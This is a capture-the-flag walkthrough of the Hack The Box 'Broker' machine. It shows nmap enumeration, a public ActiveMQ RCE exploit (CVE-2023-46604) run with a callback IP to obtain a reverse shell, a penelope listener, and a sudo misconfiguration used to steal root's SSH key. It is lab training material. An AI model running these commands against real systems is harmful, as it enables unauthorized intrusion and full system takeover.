---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Broker?tab=play_machine
Difficulty: Easy
Featured:
aliases:
  - Linux
---

---
# Information / Description

![](../../0.%20Assets/Broker-1791460954157.webp)

![](../../0.%20Assets/Broker-1791460962554.webp)

Pretty easy machine I would recommend for people starting out.

---

# Walkthrough

Let's start with the basics and run an `nmap` scan to see what the machine is exposing.

First, I'll enumerate the open ports.

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts
```

- `$T` is a variable I use to hold the target's IP address.

I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.

You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

In this case I am trying a functionality I recently discovered, which is passing an xml from an nmap 

```
sudo nmap -sV -sC -Pn -n -p 22,80,1883,5672,8161,34683,61613,61614,61616 -oX scan.xml $T  && searchsploit --nmap scan.xml
```


![](../../0.%20Assets/Broker-1791462545157.webp)

It's cool but a lot of output

so I will parse the output as an html with `xsltproc` and open it in my browser

```
xsltproc scan.xml > scan.html ; python3 -m http.server 80   
  
firefox http://localhost
```


![](../../0.%20Assets/Broker-1791462808255.webp)

After some searching online I found this

![](../../0.%20Assets/Broker-1791465568153.webp)

![](../../0.%20Assets/Broker-1791465591286.webp)

I found a couple exploits that didn't work until i found this one 

[exploit](https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell)

At first I thought it didn't work either but it does

```
python3 exploit.py -i $T -si 10.10.15.226
```

![](../../0.%20Assets/Broker-1791466256778.webp)

I will start a `penelope` session  to get a more stable shell

```
penelope -O -p 9001 -a tun0
```

![](../../0.%20Assets/Broker-1791466336761.webp)


And here we have the user flag

![](../../0.%20Assets/Broker-1791466597043.webp)

For privilege escalation I did

```
sudo -l
```

![](../../0.%20Assets/Broker-1791466917605.webp)

And found this to exploit it -> [exploit](https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406) 

It basically gives you the private key for ssh 

![](../../0.%20Assets/Broker-1791467323696.webp)

So copy it into a file, change the permissions and use it to log in as `root`

```
nano id.rsa
# copy private key

chmod 600 id.rsa
ssh -i id.rsa root@$T
```

![](../../0.%20Assets/Broker-1791467338503.webp)

And we just get the flag

![](../../0.%20Assets/Broker-1791467384544.webp)